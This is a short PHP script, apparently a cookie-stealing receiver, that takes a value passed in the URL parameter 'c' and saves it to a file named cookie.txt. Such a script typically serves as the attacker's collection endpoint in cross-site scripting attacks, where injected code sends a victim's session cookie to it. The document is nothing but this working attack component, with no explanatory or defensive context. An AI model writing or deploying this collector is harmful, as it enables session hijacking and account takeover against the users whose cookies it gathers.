<?php
$cookie = $_GET['c'];
$handle = fopen('cookie.txt', 'w');
fwrite($handle, $cookie);
fclose($handle);
